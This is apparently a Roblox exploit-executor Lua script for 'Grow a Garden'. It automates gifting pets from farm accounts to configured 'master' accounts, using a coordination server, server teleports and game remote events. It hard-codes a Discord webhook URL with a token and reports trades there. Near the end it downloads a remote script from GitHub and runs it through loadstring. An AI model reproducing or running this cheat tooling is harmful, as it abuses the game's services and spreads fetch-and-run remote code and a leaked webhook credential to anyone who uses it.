repeat task.wait() until game:IsLoaded()
repeat task.wait() 
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game) 
    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game) 
until game:GetService("Players").LocalPlayer:GetAttribute('DataFullyLoaded')

print('---------------- Executed ----------------')

getgenv().MasterConfig = {
    ['Main'] = { 
        ['Iztswvg2569'] = 'Dragonfly',
        ['Cporjxs9760'] = 'Mimic Octopus',
        ['Ktatehe7695'] = 'Kitsune'
    }
}

local player = game:GetService("Players")
local repicatestorage = game:GetService("ReplicatedStorage")
local dataservices = require(repicatestorage.Modules.DataService)
local httpservices = game:GetService("HttpService")
local username, target, last_target, toolequip
local webhook = 'https://discord.com/api/webhooks/1397642896605446225/3YcXOzqeCHJaZ35antAlUFwvvn6WzUVfsZhWc5krRDsGtVgtLFGPHFwam_HUVjjbsSDD'

-- va

_G.is_tradeing = false
_G.is_executed = false
_G.is_active = false
_G.is_exit = false

local function interact(path)
    game:GetService("GuiService").SelectedObject = path
    task.wait()
    if game:GetService("GuiService").SelectedObject == path then
        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Return, false, game)
        game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.Return, false, game)
        task.wait()
    end
    game:GetService("GuiService").SelectedObject = nil
end

local function ownerPet()
    local pet = {}
    local data = dataservices:GetData().PetsData
    local inventory = data.PetInventory
    if inventory then
        for petId, petInfo in pairs(inventory.Data) do
            for username, target in pairs(getgenv().MasterConfig.Main) do
                if petInfo.PetType == target then
                    print("Pet:", petInfo.PetType)
                    return username, target
                end
            end
        end
    end
    return nil, nil
end

local function embed(color, title, description)
    local embed = {{
		title = title,
		description = description,
		color = color, -- สีเขียวสวย
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
		footer = {
			text = "Grow a Garden Pet Trader System!"
		}
	}}

	local payload = {
		embeds = embed
	}
	local jsonData = httpservices:JSONEncode(payload)

	local response = request({
		Url = webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Content-Length"] = tostring(#jsonData)
		},
		Body = jsonData
	})

    print("Status Code:", response.StatusCode)
    print("Response Body:", response.Body)
end

task.spawn(function()
    while true do task.wait()
        pcall(function()
            if not username and not target and getgenv().MasterConfig.Main[player.LocalPlayer.Name] then -- check if not have username and target and your is main player
                for i, v in pairs(getgenv().MasterConfig.Main) do
                    if player.LocalPlayer.Name == i then
                        username = i
                        target = v
                        print(string.format("[MASTER] Username: %s, Target: %s", username, target))
                        break
                    end
                end
            elseif getgenv().MasterConfig.Main[player.LocalPlayer.Name] and username and target then -- check if main player and username and target
                while true do wait()
                    local player_server = #player:GetPlayers()
                    local api = request({
                        Url = "https://trade.zapzone.xyz/submit",
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },  
                        Body = httpservices:JSONEncode({
                            ['Username'] = username,
                            ['Target'] = target,
                            ['JobId'] = game.JobId,
                            ['Playing'] = player_server,
                            ['LastCall'] = os.time()
                        })
                    })
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(74.90898132324219, math.random(-60, -50), 190.9416046142578)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                    _G.is_active = true
                    _G.is_tradeing = true
                    if game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification") then
                        interact(game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification").Holder.Frame.Accept)
                    end
                end
            else
                while true do task.wait()
                    local x, y = ownerPet()
                    if x and y then
                        if not last_target then last_target = x end
                        local api = request({
                            Url = "https://trade.zapzone.xyz/get/"..tostring(x),
                            Method = "GET",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },  
                        })
                        local result = httpservices:JSONDecode(api.Body)
                        if result.Username then -- if username is exist
                            local _timeout = (os.time() - result.LastCall) > 10 or nil
                            if result.JobId == game.JobId and game.Players:FindFirstChild(x) then
                                print("Found Master!")
                                _G.is_tradeing = true
                                _G.is_active = true
                                for _, v in pairs(workspace.PetsPhysical:GetChildren()) do -- start move up pet
                                    if v then
                                        local owner = v:GetAttribute('OWNER') 
                                        local uuid = v:GetAttribute("UUID")
                                        if owner == player.LocalPlayer.Name then
                                            local children = workspace.PetsPhysical:GetChildren()
                                            if children[_] then
                                                for ii, vv in pairs(children[_]:GetChildren()) do
                                                    if vv:IsA('Model') then
                                                        local type_ = game:GetService("Players").LocalPlayer.PlayerGui.ActivePetUI.Frame.Main.ScrollingFrame[tostring(uuid)].PET_TYPE or ""
                                                        if type_ then
                                                            if type_.text == tostring(y) then
                                                                print(string.format('Keep Up -> pet: %s, uuid: %s', type_.text, uuid))
                                                                local args = {
                                                                    "UnequipPet",
                                                                    tostring(uuid)
                                                                }
                                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))
                                                            end
                                                        end
                                                    end
                                                end
                                            end  
                                        end
                                    end
                                end -- end move up pet
                                task.wait(5)
                                for _, tool in pairs(player.LocalPlayer.Backpack:GetChildren()) do -- start check pet in backpack
                                    if tool:GetAttribute("ItemType") == "Pet" then
                                        local namepet = tool.Name:gsub("%s%[.*", "")
                                        if namepet == y then
                                            if tool:GetAttribute("d") == true then
                                                local args = {
                                                    tool
                                                }
                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                                            end
                                            toolequip = tool.Name
                                        end
                                    end
                                end --- end check pet in backpack
                                for _, tool in pairs(player.LocalPlayer.Character:GetChildren()) do -- start check pet in character
                                    if tool:GetAttribute("ItemType") == "Pet" then
                                        local namepet = tool.Name:gsub("%s%[.*", "")
                                        if namepet == y then
                                            if tool:GetAttribute("d") == true then
                                                local args = {
                                                    tool
                                                }
                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                                            end
                                            toolequip = tool.Name
                                        end
                                    end
                                end -- end check pet in character
                                if toolequip then
                                    local chr = player.LocalPlayer.Character
                                    local bp = player.LocalPlayer.Backpack
                                    local tool
                                    if bp:FindFirstChild(toolequip) then
                                        tool = bp:FindFirstChild(toolequip)
                                    elseif chr:FindFirstChild(toolequip) then
                                        tool = chr:FindFirstChild(toolequip)
                                    end 

                                    if tool then
                                        embed(0x1abc9c, "Trade Gag", 
                                        string.format(
                                            "ผู้เล่น: %s\nรายละเอียด: %s",
                                            player.LocalPlayer.Name, tostring(tool)
                                            )
                                        )

                                        print("Equipping:", tool)
                                        chr.Humanoid:EquipTool(tool)
                                        
                                        task.wait(1)
                                        local args = {
                                            "GivePet",
                                            game:GetService("Players"):WaitForChild(x)
                                        }
                                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                        task.wait(5)
                                    else
                                        warn("Tool not found in Backpack or Character!")
                                    end                                    
                                end
                            elseif not _timeout and result.Playing < 5 and not game.Players:FindFirstChild(x) then
                                print(result.JobId, result.Playing, game.JobId)
                                local success, error = pcall(function()
                                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, result.JobId, game.Players.LocalPlayer)
                                end)
                                _G.is_active = true
                                _G.is_tradeing = true
                                task.wait(15)
                            elseif _timeout and game.Players:FindFirstChild(last_target) then
                                _G.is_active = false
                                game:Shutdown()
                            else
                                _G.is_active = false
                                print("Master Is Bussy!")
                            end
                        else
                            _G.is_active = false
                            print("Not Found Master! - Continue Farm...")
                        end
                    elseif not x and not y and _G.is_active then
                        print("Trade Succes!")
                        if not _G.is_exit then
                            embed(0xFF0000, "Trade Gag", 
                            string.format(
                                "ผู้เล่น: %s\nรายละเอียด: %s",
                                player.LocalPlayer.Name, "เทรดเสร็จสิ้น!"
                                )
                            )
                        end
                        _G.is_active = true
                        _G.is_exit = true
                        game:Shutdown()
                    else
                        _G.is_active = false
                        print("Not Pet In Target! - Continue Farm...")
                    end
                    if not _G.is_active and not _G.is_executed then
                        print("Use Aya Aya Scripts!")
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/grow_a_garden.lua"))()
                        _G.is_executed = true
                        _G.Is_Trade = false
                    end
                    if not _G.is_active then
                        task.wait(10)
                    end
                end
            end
        end)
    end
end)